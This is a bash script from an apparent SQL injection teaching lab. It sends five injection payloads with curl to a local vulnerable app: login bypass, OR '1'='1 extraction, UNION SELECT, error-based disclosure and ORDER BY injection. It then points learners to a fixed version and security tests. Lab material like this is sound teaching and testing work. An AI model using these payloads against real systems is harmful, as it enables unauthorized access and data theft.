#!/bin/bash
#
# SQL INJECTION EXPLOITATION EXAMPLES
# ====================================
# 
# This script demonstrates common SQL injection attacks
# against the vulnerable application.
#
# IMPORTANT: Only run this against localhost for educational purposes!
#

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

VULNERABLE_URL="http://localhost:5001"
FIXED_URL="http://localhost:5002"

echo "================================================================"
echo "SQL INJECTION EXPLOITATION EXAMPLES"
echo "================================================================"
echo ""
echo "⚠️  This script demonstrates attacks for educational purposes only!"
echo "   Only run against localhost (the vulnerable lab application)"
echo ""
echo "================================================================"
echo ""

# Check if server is running
echo -e "${YELLOW}[*] Checking if vulnerable server is running...${NC}"
if curl -s "$VULNERABLE_URL" > /dev/null 2>&1; then
    echo -e "${GREEN}[✓] Server is running at $VULNERABLE_URL${NC}"
else
    echo -e "${RED}[✗] Server is not running!${NC}"
    echo "   Please start it with: python3 vulnerable_app.py"
    exit 1
fi
echo ""

# Attack 1: Authentication Bypass
echo "================================================================"
echo "ATTACK 1: Authentication Bypass"
echo "================================================================"
echo ""
echo "Payload: {\"username\": \"admin' --\", \"password\": \"anything\"}"
echo "Exploits: SQL comment (--) to ignore password check"
echo ""
echo -e "${YELLOW}[*] Attempting authentication bypass...${NC}"
echo ""

response=$(curl -s -X POST "$VULNERABLE_URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'"'"' --", "password": "anything"}')

echo "Response:"
echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
echo ""

if echo "$response" | grep -q '"success": true'; then
    echo -e "${RED}[!] VULNERABLE: Successfully bypassed authentication!${NC}"
else
    echo -e "${GREEN}[✓] Attack blocked${NC}"
fi
echo ""
read -p "Press Enter to continue..."
echo ""

# Attack 2: OR-based Data Extraction
echo "================================================================"
echo "ATTACK 2: OR-based Data Extraction"
echo "================================================================"
echo ""
echo "Payload: admin' OR '1'='1"
echo "Exploits: OR condition that's always true to extract all users"
echo ""
echo -e "${YELLOW}[*] Attempting to extract all users...${NC}"
echo ""

response=$(curl -s "$VULNERABLE_URL/api/user/admin'%20OR%20'1'='1")

echo "Response:"
echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
echo ""

user_count=$(echo "$response" | grep -o '"id"' | wc -l)
if [ "$user_count" -gt 1 ]; then
    echo -e "${RED}[!] VULNERABLE: Extracted $user_count users (should be 1 or 0)${NC}"
else
    echo -e "${GREEN}[✓] Attack blocked${NC}"
fi
echo ""
read -p "Press Enter to continue..."
echo ""

# Attack 3: UNION-based Injection
echo "================================================================"
echo "ATTACK 3: UNION-based SQL Injection"
echo "================================================================"
echo ""
echo "Payload: admin' UNION SELECT 1,2,3,4--"
echo "Exploits: UNION to combine with attacker-controlled SELECT"
echo ""
echo -e "${YELLOW}[*] Attempting UNION-based injection...${NC}"
echo ""

response=$(curl -s "$VULNERABLE_URL/api/search?q=admin'%20UNION%20SELECT%201,2,3,4--")

echo "Response:"
echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
echo ""

if echo "$response" | grep -q '"username": "2"' || echo "$response" | grep -q 'UNION'; then
    echo -e "${RED}[!] VULNERABLE: UNION injection successful!${NC}"
else
    echo -e "${GREEN}[✓] Attack blocked or failed${NC}"
fi
echo ""
read -p "Press Enter to continue..."
echo ""

# Attack 4: Error-based Information Disclosure
echo "================================================================"
echo "ATTACK 4: Error-based Information Disclosure"
echo "================================================================"
echo ""
echo "Payload: admin'"
echo "Exploits: Unclosed quote to trigger SQL error"
echo ""
echo -e "${YELLOW}[*] Attempting to trigger SQL error...${NC}"
echo ""

response=$(curl -s "$VULNERABLE_URL/api/user/admin'")

echo "Response:"
echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
echo ""

if echo "$response" | grep -qi 'syntax\|sqlite\|SQL' || echo "$response" | grep -q 'query'; then
    echo -e "${RED}[!] VULNERABLE: SQL error information leaked!${NC}"
else
    echo -e "${GREEN}[✓] No information disclosure${NC}"
fi
echo ""
read -p "Press Enter to continue..."
echo ""

# Attack 5: ORDER BY Injection
echo "================================================================"
echo "ATTACK 5: ORDER BY Injection (Column Enumeration)"
echo "================================================================"
echo ""
echo "Payload: ?sort=username DESC--"
echo "Exploits: Injecting SQL into ORDER BY clause"
echo ""
echo -e "${YELLOW}[*] Attempting ORDER BY injection...${NC}"
echo ""

response=$(curl -s "$VULNERABLE_URL/api/users?sort=username%20DESC--")

echo "Response (truncated):"
echo "$response" | python3 -m json.tool 2>/dev/null | head -20 || echo "$response"
echo ""

if echo "$response" | grep -q '"users"'; then
    echo -e "${RED}[!] VULNERABLE: ORDER BY injection successful!${NC}"
else
    echo -e "${GREEN}[✓] Attack blocked${NC}"
fi
echo ""

# Summary
echo "================================================================"
echo "SUMMARY"
echo "================================================================"
echo ""
echo "The vulnerable application is susceptible to:"
echo "  1. ✗ Authentication bypass via SQL injection"
echo "  2. ✗ Data extraction using OR-based injection"
echo "  3. ✗ UNION-based SQL injection"
echo "  4. ✗ Information disclosure through error messages"
echo "  5. ✗ ORDER BY clause injection"
echo ""
echo "Next steps:"
echo "  1. Study how each attack works"
echo "  2. Review the vulnerable code in vulnerable_app.py"
echo "  3. Compare with the fixed version in fixed_app.py"
echo "  4. Run test_security.py to verify the fixes"
echo ""
echo "================================================================"
